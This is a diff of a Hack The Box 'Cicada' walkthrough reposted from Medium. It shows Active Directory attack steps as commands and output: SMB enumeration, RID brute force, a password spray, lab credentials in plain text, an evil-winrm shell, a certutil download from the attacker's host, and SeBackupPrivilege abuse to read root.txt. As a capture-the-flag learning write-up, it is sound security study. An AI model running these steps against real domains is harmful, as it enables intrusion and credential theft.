@@ -1,23 +1,16 @@
 # :game_die: Cicada-HTB-Walkthrough-By-Reju-Kole
 
-> **Original Source:** [Cicada-HTB-Walkthrough-By-Reju-Kole](https://infosecwriteups.com/cicada-htb-walkthrough-by-reju-kole-8a056b906b97)
-> **Platform:** infosecwriteups.com | **Category:** `MISC`
-
 ---
 
 # Cicada-HTB-Walkthrough-By-Reju-Kole
 
-
 *CicadaWelcome! It is time to look at the Cicada machine on HackTheBox. I am making these walkthroughs to keep myself motivated to learn cyber security and ensure that I remember the knowledge gained by playing HTB machines.Join me on learning cyber security. I will try and explain concepts as I go, to differentiate myself from other walkthroughs.*Level — EasyMachine URL : [Hack The Box :: Hack The Box](https://app.hackthebox.com/machines/Cicada)
-
 
 About Cicada — *Cicada is an easy-difficult Windows machine that focuses on beginner Active Directory enumeration and exploitation. In this machine, players will enumerate the domain, identify users, navigate shares, uncover plaintext passwords stored in files, execute a password spray, and use the `SeBackupPrivilege` to achieve full system compromise.Machine Matrix*
 
 ## Enumeration
 
-
 *To kick off this box, let’s run a Nmap scan to see what services and ports are open.*
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -85,24 +78,19 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 139.42 seconds
 ```
 
-
 *The scan shows that the ports for TCP (53) & DNS Service are open and running as Simple DNS Plus, TCP (88) is open with the Kerberos service, TCP (135) is open and running Microsoft Windows RPC, TCP (139) is open with NetBIOS-SSN, TCP (389) & LDAP Service is running for Microsoft Windows Active Directory, and TCP (445) is open for Microsoft-DS. The ports TCP (464), TCP (593) for RPC over HTTP, TCP (636) & SSL/LDAP, and TCP (3268), and TCP (3269) are also open, running various Active Directory services.*
 
 >
 
 Let’s add Cicada host to our /etc/hosts file.
 
-
 ```
 sudo echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts
 ```
 
-
 ## ENUMERATING SMB
 
-
 ### 1. Explore SMB Shares with smbclient
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -123,11 +111,9 @@ do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-
 *Displays accessible SMB shares on the target host.*
 
 ### 2. Access the `HR` Share with SMBv2
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -145,9 +131,7 @@ getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.8 KiloByt
 smb: \>
 ```
 
-
 *Access the HR share with anonymous login, enforcing the SMBv2 protocol.*
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -177,22 +161,17 @@ Best regards,
 Cicada Corp
 ```
 
-
 *Inside of Notice from HR.txt.*
 
 ### 3. Read `Notice from HR.txt` for Credentials
-
 
 *For details on the credentials for user michael.wrightson, please consult the ‘Notice from HR.txt’ file.*
 
 ## Enumerating Users
 
-
 ### 4. Enumerate Users via RID Bruteforce Using crackmapexec
 
-
 *Our goal is to discover domain users by performing a brute force on the RID.*
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -233,17 +212,13 @@ SMB cicada.htb 445 CICADA-DC 1109: CICADA\Dev Support (SidTypeGroup)
 SMB cicada.htb 445 CICADA-DC 1601: CICADA\emily.oscars (SidTypeUser)
 ```
 
-
 *Here, we’ve gathered several usernames. Let’s try to validate them using the password we discovered.I saved all the usernames in a text file and conducted a password spray.*
-
 
 ```
 crackmapexec smb 10.10.11.35 -u username.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
 ```
 
-
 *We successfully identified a user who is using the password we discovered.Next, we’ll attempt lateral movement to locate a user with higher privileges.*
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -261,26 +236,19 @@ SMB 10.10.11.35 445 CICADA-DC cicada.htb\Guest badpwdcount: 0 desc: Built-in acc
 SMB 10.10.11.35 445 CICADA-DC cicada.htb\Administrator badpwdcount: 0 desc: Built-in account for administering the computer/domain
 ```
 
-
 *We discovered a user whose password is stored in their account description.*
-
 
 ## Get Reju Kole’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
-
 
 Remember me for faster sign in
 
-
 *Then run *`*smbmap*`* to verify if this user has access to additional shares, and it turns out they do have access to several more shares.*
-
 
 ```
 smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
 ```
-
 
 ```
 [-] Enumerating shares... [\] Enumerating shares...
@@ -297,14 +265,11 @@ SYSVOL READ ONLY Logon server share
 [|] Closing connections.. [/] Closing connections..
 ```
 
-
 *We examine the ‘DEV’ share and find a PowerShell script named *`*Backup_script.ps1*`*.*
-
 
 ```
 smbclient \\\\10.10.11.35\\DEV -U 'david.orelious' -N 'aRt$Lp#7t*VQ!3'
 ```
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -321,9 +286,7 @@ getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.6 KiloBytes/
 smb: \>
 ```
 
-
 *Upon inspecting the contents of *`*Backup_script.ps1*`*, we uncover a new username and password!*
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -342,23 +305,17 @@ Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
 
-
 ## Getting the shell
-
 
 ### User.txt
 
-
 *After enumerating the shares with our newly found credentials and finding no additional access, we decide to try obtaining a shell using *`*evil-winrm*`*.*
-
 
 ```
 evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 ```
 
-
 *We successfully gain a shell!*
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -375,14 +332,11 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls
 
-
 Directory: C:\Users\emily.oscars.CICADA\Desktop
-
 
 Mode LastWriteTime Length Name
 ---- ------------- ------ ----
 -ar--- 11/8/2024 2:26 PM 34 user.txt
-
 
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami
 cicada\emily.oscars
@@ -391,20 +345,15 @@ cicada\emily.oscars
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop>
 ```
 
-
 >
 
 User.txt — 47cb26e784f790b49e8b1a0a7fc7d96d
 
-
 ## PRIVILEGE ESCALATION
-
 
 ### Root.txt
 
-
 *We perform basic enumeration to check the privileges our user has on the machine.*
-
 
 ```
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv
@@ -420,23 +369,17 @@ SeChangeNotifyPrivilege Bypass traverse checking Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-
 *We observe some interesting privileges, and further research leads us to *[abusing tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)*.With the help of this, we understand that the ‘SeBackupPrivilege’ can be exploited to gain read access to any file. We can use this to retrieve the root.txt file.After conducting further research, we find this PowerShell script (linked below) that allows us to access the root.txt file.*
-
 
 [Acl-FullControl.ps1 — GitHub](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
 
-
 *We begin by transferring the script to the target computer using our Python server and the following command.*
-
 
 ```
 certutil -urlcache -f http://10.10.16.78:80/FullControl.ps1 FullControl.ps1
 ```
 
-
 *You need to run a Python server on your Kali machine and execute this command on the victim’s Evil-WinRM terminal.*
-
 
 ```
 
@@ -456,15 +399,12 @@ Online
 CertUtil: -URLCache command completed successfully.
 ```
 
-
 *I have saved this script as “FullControl.ps1” on my system.Next, we run the script using the following command to gain access to the ‘root.txt’ file.*
-
 
 ```
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> . .\FullControl.ps1
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> Acl-FullControl -user cicada\emily.oscars -path C:\users\administrator\desktop
 [+] Current permissions:
-
 
 Path : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\desktop
 Owner : BUILTIN\Administrators
@@ -476,10 +416,8 @@ CICADA\Administrator Allow FullControl
 Audit :
 Sddl : O:BAG:DUD:AI(D;OICIID;FA;;;S-1-5-21-917908876-1423158569-3159038727-1601)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)
 
-
 [+] Changing permissions to C:\users\administrator\desktop
 [+] Acls changed successfully.
-
 
 Path : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\desktop
 Owner : BUILTIN\Administrators
@@ -493,33 +431,26 @@ Audit :
 Sddl : O:BAG:DUD:AI(A;OICI;FA;;;S-1-5-21-917908876-1423158569-3159038727-1601)(D;OICIID;FA;;;S-1-5-21-917908876-1423158569-3159038727-1601)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)
 ```
 
-
 *Now, we can view the contents of the ‘root.txt’ file!*
-
 
 ```
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cd C:\Users\administrator\Desktop
 *Evil-WinRM* PS C:\Users\administrator\Desktop> ls
 
-
 Directory: C:\Users\administrator\Desktop
-
 
 Mode LastWriteTime Length Name
 ---- ------------- ------ ----
 -ar--- 11/8/2024 2:26 PM 34 root.txt
-
 
 *Evil-WinRM* PS C:\Users\administrator\Desktop> cat root.txt
 d60a755a174363787542d42dbcf0fd86
 *Evil-WinRM* PS C:\Users\administrator\Desktop>
 ```
 
-
 >
 
 Root.txt — d60a755a174363787542d42dbcf0fd86
-
 
 *Hehe!!! Finally, we got the root flag.I hope you enjoyed this writeup! Happy Hacking :)*
 
@@ -527,24 +458,17 @@ Root.txt — d60a755a174363787542d42dbcf0fd86
 
 Subscribe to me on Medium and be sure to turn on email notifications so you never miss out on my latest walkthroughs, write-ups, and other informative posts.
 
-
 ## Follow me on below Social Media:
-
 
 - *LinkedIn: *[Reju Kole](http://www.linkedin.com/in/reju-kole)
 
-
 *2. Instagram: *[reju.kole.9](https://www.instagram.com/reju.kole.9?igsh=MW1iZ2w0dXA4bjBxNg%3D)
-
 
 *3. Respect me On HackTheBox! : *[Hack The Box :: User Profile](https://app.hackthebox.com/users/1671324)
 
-
 *4. Check My TryHackMe Profile : *[TryHackMe | W40X](https://tryhackme.com/p/W40X)
 
-
 *5. Twitter | X : *[@Mr_W40X](https://x.com/Mr_W40X)
-
 
 *6. GitHub : *[W40X | Reju Kole | Security Researcher](https://github.com/W40X)
 
@@ -553,6 +477,3 @@ Subscribe to me on Medium and be sure to turn on email notifications so you neve
 incase you need any help feel free to message me on my social media handles.
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/cicada-htb-walkthrough-by-reju-kole-8a056b906b97). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
